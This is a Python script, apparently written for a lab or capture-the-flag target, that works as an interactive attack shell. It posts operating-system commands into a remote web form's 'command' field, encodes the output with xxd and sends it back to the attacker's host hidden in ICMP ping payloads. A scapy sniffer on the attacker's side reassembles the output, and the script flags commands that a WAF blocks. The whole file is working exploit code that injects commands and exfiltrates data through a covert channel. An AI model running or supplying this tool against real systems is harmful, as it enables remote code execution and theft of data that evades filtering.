#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Usage: python3 ICMPShell.py <LHOST> <RHOST>

import cmd
import sys
from threading import Thread
from urllib.parse import quote_plus

import requests
from scapy.all import *

M = '\033[%s;35m'  # MAGENTA
Y = '\033[%s;33m'  # YELLOW
R = '\033[%s;31m'  # RED
S = '\033[0m'      # RESET

MARKER = 'STOP'


class ICMPSniffer(Thread):

	def __init__(self, iface='tun0'):
		super().__init__()
		self.iface = iface

	def run(self):
		sniff(iface=self.iface, filter='icmp[icmptype]==8', prn=self.process_icmp)

	def process_icmp(self, pkt):
		buf = pkt[ICMP].load[16:32].decode('utf-8')

		setmarker = set(MARKER)
		if set(buf[-4:]) == setmarker and set(buf) != setmarker:
				buf = buf[:buf.index(MARKER)]

		print(buf, end='', flush=True)


class Terminal(cmd.Cmd):

	prompt = f'{M%0}ICMPShell{S}> '

	def __init__(self, LHOST, RHOST, proxies=None):
		super().__init__()

		if proxies:
			self.proxies = {'http': proxies}
		else:
			self.proxies = {}

		self.LHOST = LHOST
		self.RHOST = RHOST
		self.inject = r"""{ {cmd}; echo {MARKER}; } 2>&1 | xxd -p | tr -d '\n' | fold -w 32 | while read output; do ping -c 1 -p $output {LHOST}; done"""

	def do_cmd(self, cmd):
		try:
			resp = requests.post(
				f'http://{self.RHOST}/',
				data=f'command={quote_plus(self.inject.format(cmd=cmd, MARKER=MARKER*4, LHOST=self.LHOST))}',
				headers={'Content-Type': 'application/x-www-form-urlencoded'},
				proxies=self.proxies
			)

			if resp.status_code == 200:
				if 'Command is not allowed.' in resp.text:
					print(f'{Y%0}[!] Command triggers WAF filter. Try something else{S}')

		except requests.exceptions.ConnectionError as e:
			print(str(e))
			print(f'{R%0}[-] No response from {self.RHOST}{S}')

		finally:
			print()

	def do_EOF(self, args):
		print()
		return True

	def emptyline(self):
		pass


if __name__ == '__main__':
	if len(sys.argv) < 3:
		print(f'Usage: python3 {sys.argv[0]} <LHOST> <RHOST>')
		sys.exit()
	else:
		LHOST = sys.argv[1]
		RHOST = sys.argv[2]

	sniffer = ICMPSniffer()
	sniffer.daemon = True
	sniffer.start()

	terminal = Terminal(
		LHOST,
		RHOST,
		# proxies='http://127.0.0.1:8080'  # Burp
	)
	terminal.cmdloop()
